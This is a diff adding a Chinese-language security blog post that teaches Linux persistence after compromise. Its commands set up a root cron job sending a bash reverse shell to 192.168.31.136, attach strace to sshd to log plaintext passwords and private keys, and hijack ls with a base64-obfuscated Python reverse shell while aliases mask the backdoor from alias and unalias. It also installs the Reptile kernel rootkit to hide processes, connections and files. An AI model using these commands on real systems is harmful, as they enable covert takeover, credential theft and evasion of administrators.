@@ -1,0 +1,634 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="F4tty" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      Linux权限维持(二)-Cron定时任务&amp;Strace监控&amp;Alias别名&amp;Rootkit后门 
+      
+      
+      |
+    
+     F4tty
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/img/favicon.ico">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/img/avatar.jpg" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">F4tty</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">主页</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">归档</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">分类</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">标签</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">友链</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">关于我</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">Linux权限维持(二)-Cron定时任务&Strace监控&Alias别名&Rootkit后门</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+          2022-11-10 00:00:00
+        </span>
+        
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark" title="分类"></i>
+                
+                <span class="span--category">
+                  <a href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" title="内网安全">
+                    <b>#</b> 内网安全
+                  </a>
+                </span>
+                
+              </span>
+          
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="标签"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/%E5%86%85%E7%BD%91/" title="内网">
+                    #内网
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="Linux权限维持-二-Cron定时任务-amp-Strace监控-amp-Alias别名-amp-Rootkit后门"><a href="#Linux权限维持-二-Cron定时任务-amp-Strace监控-amp-Alias别名-amp-Rootkit后门" class="headerlink" title="Linux权限维持(二)-Cron定时任务&amp;Strace监控&amp;Alias别名&amp;Rootkit后门"></a>Linux权限维持(二)-Cron定时任务&amp;Strace监控&amp;Alias别名&amp;Rootkit后门</h1><h2 id="定时任务-Cron后门"><a href="#定时任务-Cron后门" class="headerlink" title="定时任务-Cron后门"></a>定时任务-Cron后门</h2><p>利用系统的定时任务功能进行反弹Shell</p>
+<h3 id="1、编辑后门反弹"><a href="#1、编辑后门反弹" class="headerlink" title="1、编辑后门反弹"></a>1、编辑后门反弹</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/.test.sh</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.31.136/3333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/1e8c3e31/1668041111388-dbd770f3-dfca-4a06-b5c0-32209e718cc7.png" alt="image.png"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x /etc/.test.sh</span><br></pre></td></tr></table></figure>
+
+<h3 id="2、添加定时任务"><a href="#2、添加定时任务" class="headerlink" title="2、添加定时任务"></a>2、添加定时任务</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/crontab</span><br><span class="line">*/1 * * * * root /etc/.test.sh #以root权限每分钟执行该文件</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/1e8c3e31/1668041371088-935db5fc-8097-4104-978d-107d6776645f.png" alt="image.png"><br>即使退出该shell隔1分钟依然可以接受到shell</p>
+<h2 id="监控功能-Strace后门"><a href="#监控功能-Strace后门" class="headerlink" title="监控功能-Strace后门"></a>监控功能-Strace后门</h2><p>strace是一个动态跟踪工具，它可以跟踪系统调用的执行。我们可以把他当成一个键盘记录的后门，来扩大我们的信息收集范围</p>
+<h3 id="1、记录sshd明文"><a href="#1、记录sshd明文" class="headerlink" title="1、记录sshd明文"></a>1、记录sshd明文</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">开启记录</span></span><br><span class="line">(strace -f -F -p `ps aux|grep &quot;sshd -D&quot;|grep -v grep|awk &#123;&#x27;print $2&#x27;&#125;` -t -e trace=read,write -s 32 2&gt; /tmp/.sshd.log &amp;)</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">管理员ssh连接后查看.sshd.log中的记录</span></span><br><span class="line">grep -E &#x27;read\(6, &quot;.+\\0\\0\\0\\.+&quot;&#x27; /tmp/.sshd.log</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/1e8c3e31/1668043361196-b97ffc94-e123-4516-9e02-76ec92b03abc.png" alt="image.png"></p>
+<h3 id="2、记录sshd私钥"><a href="#2、记录sshd私钥" class="headerlink" title="2、记录sshd私钥"></a>2、记录sshd私钥</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(strace -f -F -p `ps aux|grep &quot;sshd -D&quot;|grep -v grep|awk &#123;&#x27;print $2&#x27;&#125;` -t -e trace=read,write -s 4096 2&gt; /tmp/.sshd.log &amp;)</span><br><span class="line">grep &#x27;PRIVATE KEY&#x27; /tmp/.sshd.log</span><br></pre></td></tr></table></figure>
+
+<h2 id="命令自定义-Alias后门"><a href="#命令自定义-Alias后门" class="headerlink" title="命令自定义-Alias后门"></a>命令自定义-Alias后门</h2><p>alias命令的功能：为命令设置别名</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">定义：</span></span><br><span class="line">alias ls=&#x27;ls -al&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>每次输入ls命令的时候都能实现ls -al<br><img src="/posts/1e8c3e31/1668043941382-10964b1b-5df2-4c47-bbc3-65b2c23ae5b8.png" alt="image.png"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">删除别名</span></span><br><span class="line">unalias ls</span><br></pre></td></tr></table></figure>
+
+<h3 id="1、简单版"><a href="#1、简单版" class="headerlink" title="1、简单版"></a>1、简单版</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">将<span class="built_in">ls</span>设置为反弹shell</span></span><br><span class="line">alias ls=&#x27;alerts()&#123; ls $* --color=auto;bash -i &gt;&amp; /dev/tcp/192.168.31.136/3333 0&gt;&amp;1; &#125;;alerts&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>当输入ls时就会反弹shell<br><img src="/posts/1e8c3e31/1668044210623-95f2b094-07bf-438b-a99d-9c8d2cec0e20.png" alt="image.png"><br>但是该方法有一个缺点：输入ls后会卡住<br><img src="/posts/1e8c3e31/1668044317325-4fbee66c-ead6-4aa4-83a9-d361c1b38c14.png" alt="image.png"></p>
+<h3 id="2、升级版"><a href="#2、升级版" class="headerlink" title="2、升级版"></a>2、升级版</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alias ls=&#x27;alerts()&#123; ls $* --color=auto;python3 -c &quot;import base64,sys;exec(base64.b64decode(&#123;2:str,3:lambda b:bytes(b,&#x27;\&#x27;&#x27;UTF-8&#x27;\&#x27;&#x27;)&#125;[sys.version_info[0]](&#x27;\&#x27;&#x27;aW1wb3J0IG9zLHNvY2tldCxzdWJwcm9jZXNzOwpyZXQgPSBvcy5mb3JrKCkKaWYgcmV0ID4gMDoKICAgIGV4aXQoKQplbHNlOgogICAgdHJ5OgogICAgICAgIHMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCiAgICAgICAgcy5jb25uZWN0KCgiMTkyLjE2OC4zMS4xMzYiLCA2NjY2KSkKICAgICAgICBvcy5kdXAyKHMuZmlsZW5vKCksIDApCiAgICAgICAgb3MuZHVwMihzLmZpbGVubygpLCAxKQogICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSwgMikKICAgICAgICBwID0gc3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsICItaSJdKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIGV4aXQoKQ==&#x27;\&#x27;&#x27;)))&quot;;&#125;;alerts&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>命令中的base64解密如下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import os,socket,subprocess;</span><br><span class="line">ret = os.fork()</span><br><span class="line">if ret &gt; 0:</span><br><span class="line">    exit()</span><br><span class="line">else:</span><br><span class="line">    try:</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect((&quot;192.168.31.136&quot;, 6666))</span><br><span class="line">        os.dup2(s.fileno(), 0)</span><br><span class="line">        os.dup2(s.fileno(), 1)</span><br><span class="line">        os.dup2(s.fileno(), 2)</span><br><span class="line">        p = subprocess.call([&quot;/bin/sh&quot;, &quot;-i&quot;])</span><br><span class="line">    except Exception as e:</span><br><span class="line">        exit()</span><br></pre></td></tr></table></figure>
+
+<p>就是利用socket反弹一个shell<br>继续输入命令</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alias unalias=&#x27;alerts()&#123; if [ $# != 0 ]; then if [ $* != &quot;ls&quot; ]&amp;&amp;[ $* != &quot;alias&quot; ]&amp;&amp;[ $* != &quot;unalias&quot; ]; then unalias $*;else echo &quot;-bash: unalias: $&#123;*&#125;: not found&quot;;fi;else echo &quot;unalias: usage: unalias [-a] name [name ...]&quot;;fi;&#125;;alerts&#x27;</span><br><span class="line">alias alias=&#x27;alerts()&#123; alias &quot;$@&quot; | grep -v unalias | sed &quot;s/alerts.*lambda.*/ls --color=auto&#x27;\&#x27;&#x27;/&quot;;&#125;;alerts&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>执行ls后会反弹shell<br><img src="/posts/1e8c3e31/1668045812049-1f057439-e381-4e31-93b2-bd5e3618d032.png" alt="image.png"><br><strong>但是该方法重启之后会失效</strong></p>
+<h3 id="3、持久化-隐藏"><a href="#3、持久化-隐藏" class="headerlink" title="3、持久化+隐藏"></a>3、持久化+隐藏</h3><p>重启后依旧有效</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/upload</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">将上面的三个后门命令写入</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">alias ls=&#x27;alerts()&#123; ls $* --color=auto;python3 -c &quot;import base64,sys;exec(base64.b64decode(&#123;2:str,3:lambda b:bytes(b,&#x27;\&#x27;&#x27;UTF-8&#x27;\&#x27;&#x27;)&#125;[sys.version_info[0]](&#x27;\&#x27;&#x27;aW1wb3J0IG9zLHNvY2tldCxzdWJwcm9jZXNzOwpyZXQgPSBvcy5mb3JrKCkKaWYgcmV0ID4gMDoKICAgIGV4aXQoKQplbHNlOgogICAgdHJ5OgogICAgICAgIHMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCiAgICAgICAgcy5jb25uZWN0KCgiMTkyLjE2OC4zMS4xMzYiLCA2NjY2KSkKICAgICAgICBvcy5kdXAyKHMuZmlsZW5vKCksIDApCiAgICAgICAgb3MuZHVwMihzLmZpbGVubygpLCAxKQogICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSwgMikKICAgICAgICBwID0gc3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsICItaSJdKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIGV4aXQoKQ==&#x27;\&#x27;&#x27;)))&quot;;&#125;;alerts&#x27;</span><br><span class="line">alias unalias=&#x27;alerts()&#123; if [ $# != 0 ]; then if [ $* != &quot;ls&quot; ]&amp;&amp;[ $* != &quot;alias&quot; ]&amp;&amp;[ $* != &quot;unalias&quot; ]; then unalias $*;else echo &quot;-bash: unalias: $&#123;*&#125;: not found&quot;;fi;else echo &quot;unalias: usage: unalias [-a] name [name ...]&quot;;fi;&#125;;alerts&#x27;</span><br><span class="line">alias alias=&#x27;alerts()&#123; alias &quot;$@&quot; | grep -v unalias | sed &quot;s/alerts.*lambda.*/ls --color=auto&#x27;\&#x27;&#x27;/&quot;;&#125;;alerts&#x27;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vim ~/.bashrc</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">在最后面写入</span></span><br><span class="line">if [ -f /etc/upload ]; then</span><br><span class="line">	. /etc/upload</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
+
+<p>重启后输入ls依旧可以反弹shell<br><img src="/posts/1e8c3e31/1668047185034-c2d92e26-4c81-4068-b76b-7c68490334d9.png" alt="image.png"></p>
+<h2 id="内核加载LKM-Rootkit后门"><a href="#内核加载LKM-Rootkit后门" class="headerlink" title="内核加载LKM-Rootkit后门"></a>内核加载LKM-Rootkit后门</h2><p>现在常用的linux维持权限的方法大多用crontab和开机自启动，同时使用的大多是msf 或者其它的tcp连接来反弹shell ,这种做法比较容易被管理员发现。所以我们想有一个非tcp连接、流量不容易被怀疑的后门，并且在大量的shell的场景下，可以管shell，Reptile刚好是种LKM rootkit，因此具有很好的隐藏性和强大的功能。<br><a target="_blank" rel="noopener" href="https://github.com/f0rb1dd3n/Reptile/releases/">https://github.com/f0rb1dd3n/Reptile/releases/</a></p>
+<h3 id="自动化脚本搭建"><a href="#自动化脚本搭建" class="headerlink" title="自动化脚本搭建"></a>自动化脚本搭建</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim shell.sh</span><br></pre></td></tr></table></figure>
+
+<h4 id="Centos"><a href="#Centos" class="headerlink" title="Centos"></a>Centos</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">kernel=`<span class="built_in">uname</span> -r`</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">centos</span></span><br><span class="line">yum -y install perl vim gcc make g++ unzip</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">由于Cenots内核管理不便，所以使用下载对应版本的kernel-devel到本地</span></span><br><span class="line">yum -y localinstall kernel-devel-&quot;$kernal&quot;.rpm</span><br><span class="line">cd Reptile-2.0/ &amp;&amp; chmod +x ./setup.sh </span><br><span class="line">./setup.sh install &lt;&lt;EOF</span><br><span class="line">reptile</span><br><span class="line">hax0r</span><br><span class="line">s3cr3t</span><br><span class="line">reptile</span><br><span class="line">666</span><br><span class="line">y</span><br><span class="line">192.168.31.136</span><br><span class="line">4444</span><br><span class="line">1</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>
+
+<p>需要修改6行的文件地址<br>8，9行为密码和口令<br>14,15行为接收ip及端口</p>
+<h4 id="ubuntu"><a href="#ubuntu" class="headerlink" title="ubuntu"></a>ubuntu</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">apt-get install vim gcc make g++ unzip -y</span><br><span class="line">apt-get -y install linux-headers-$(uname -r)</span><br><span class="line">cd Reptile-2.0/ &amp;&amp; chmod +x ./setup.sh</span><br><span class="line">./setup.sh install &lt;&lt;EOF</span><br><span class="line">reptile</span><br><span class="line">hax0r</span><br><span class="line">s3cr3t</span><br><span class="line">reptile</span><br><span class="line">666</span><br><span class="line">y</span><br><span class="line">192.168.31.136</span><br><span class="line">4444</span><br><span class="line">1</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 shell.sh</span><br><span class="line">./shell.sh</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/1e8c3e31/1668049640677-570d3cf1-aa11-45d3-a6df-a40dce95fce6.png" alt="image.png"><br>安装完成</p>
+<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p><a target="_blank" rel="noopener" href="https://github.com/f0rb1dd3n/Reptile/wiki">https://github.com/f0rb1dd3n/Reptile/wiki</a></p>
+<h4 id="隐藏进程"><a href="#隐藏进程" class="headerlink" title="隐藏进程"></a>隐藏进程</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">隐藏进程</span></span><br><span class="line">/reptile/reptile_cmd hide</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">显示进程</span></span><br><span class="line">/reptile/reptile_cmd show</span><br></pre></td></tr></table></figure>
+
+<p>测试</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup ping 114.114.114.114 &amp; ps -ef | grep ping | grep -v grep</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/1e8c3e31/1668050007522-2c016976-4440-4c36-862f-e8a6c27e46f9.png" alt="image.png"><br>创建了一个ping进程<br>尝试把进程隐藏</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/reptile/reptile_cmd hide 12551</span><br><span class="line">ps -ef | grep ping | grep -v grep</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/1e8c3e31/1668050076342-1301f63e-eec6-4fcf-8846-5e3392fe537e.png" alt="image.png"><br>进程成功隐藏</p>
+<h4 id="隐藏连接"><a href="#隐藏连接" class="headerlink" title="隐藏连接"></a>隐藏连接</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">隐藏连接:</span> </span><br><span class="line">/reptile/reptile_cmd [udp/tcp等] [目标地址] hide</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">显示连接:</span></span><br><span class="line">/reptile/reptile_cmd [udp/tcp等] [目标地址] show</span><br></pre></td></tr></table></figure>
+
+<p>使用msf上线会存在一个连接，可以使用reptile隐藏</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netstat -anpt | grep 192.168.31.136</span><br><span class="line">/reptile/reptile_cmd tcp 192.168.31.136 7878 hide</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/1e8c3e31/1668051009023-59989ebc-9a4d-4acc-b20b-2149430654b5.png" alt="image.png"></p>
+<h4 id="隐藏文件"><a href="#隐藏文件" class="headerlink" title="隐藏文件"></a>隐藏文件</h4><p>文件名中带reptile的都会被隐藏</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir reptile_123</span><br><span class="line">ls</span><br><span class="line">cd reptile_123</span><br></pre></td></tr></table></figure>
+
+<p>使用ls可以无法看到文件,但是可以cd进文件<br><img src="/posts/1e8c3e31/1668051228687-b2817603-bff6-464c-aa87-3ba0209c1e23.png" alt="image.png"></p>
+<h3 id="客户端使用"><a href="#客户端使用" class="headerlink" title="客户端使用"></a>客户端使用</h3><p>客户端安装</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd Reptile-2.0/</span><br><span class="line">./setup.sh client</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/1e8c3e31/1668060445419-6594e286-2699-4367-8337-7aa46f601d4b.png" alt="image.png"><br>启动客户端</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd bin</span><br><span class="line">./client</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/1e8c3e31/1668060658242-7323d2e7-08a3-45a1-a328-53d86609ae0e.png" alt="image.png"><br>设置连接配置</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">set LHOST x.x.x.x			#接受shell地址</span><br><span class="line">set LPORT xxxx				#接受shell端口</span><br><span class="line">set SRCHOST x.x.x.x		#接受shell地址</span><br><span class="line">set SRCPORT 666				#前面后门配置中的SRC port</span><br><span class="line">set RHOST x.x.x.x			#目标地址</span><br><span class="line">set RPORT 22					#远程端口(仅适用于TCP/UDP) 这里选择22模拟ssh</span><br><span class="line">set PROT TCP 					#发送数据包的协议(ICMP/TCP/UDP)</span><br><span class="line">set PASS s3cr3t 			#后门密码(前面设置的)</span><br><span class="line">set TOKEN hax0r 			#后门Token</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/1e8c3e31/1668062022223-64d84f36-7e11-4f1c-ab1b-70cff9d805ae.png" alt="image.png"><br><img src="/posts/1e8c3e31/1668062039478-b41e8b5f-9168-4153-bcc8-40d2721d3a7d.png" alt="image.png"><br>成功返回shell,除了返回shell 还可以上传下载文件等<br><img src="/posts/1e8c3e31/1668062935375-32c77ff5-faad-4be4-9eda-045c7d5ca0dc.png" alt="image.png"></p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/posts/cf253a42/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+              2022-11-10 00:00:00
+            </span>
+            
+                  <span class="post-categories">
+                    <i class="iconfont icon-bookmark" title="分类"></i>
+                    
+                    <span class="span--category">
+                      <a href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" title="内网安全">
+                        <b>#</b> 内网安全
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="标签"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/%E5%86%85%E7%BD%91/" title="内网">
+                        #内网
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E4%BA%8C-Cron%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-amp-Strace%E7%9B%91%E6%8E%A7-amp-Alias%E5%88%AB%E5%90%8D-amp-Rootkit%E5%90%8E%E9%97%A8"><span class="toc-text">Linux权限维持(二)-Cron定时任务&amp;Strace监控&amp;Alias别名&amp;Rootkit后门</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-Cron%E5%90%8E%E9%97%A8"><span class="toc-text">定时任务-Cron后门</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E7%BC%96%E8%BE%91%E5%90%8E%E9%97%A8%E5%8F%8D%E5%BC%B9"><span class="toc-text">1、编辑后门反弹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E6%B7%BB%E5%8A%A0%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1"><span class="toc-text">2、添加定时任务</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%91%E6%8E%A7%E5%8A%9F%E8%83%BD-Strace%E5%90%8E%E9%97%A8"><span class="toc-text">监控功能-Strace后门</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E8%AE%B0%E5%BD%95sshd%E6%98%8E%E6%96%87"><span class="toc-text">1、记录sshd明文</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E8%AE%B0%E5%BD%95sshd%E7%A7%81%E9%92%A5"><span class="toc-text">2、记录sshd私钥</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E8%87%AA%E5%AE%9A%E4%B9%89-Alias%E5%90%8E%E9%97%A8"><span class="toc-text">命令自定义-Alias后门</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" 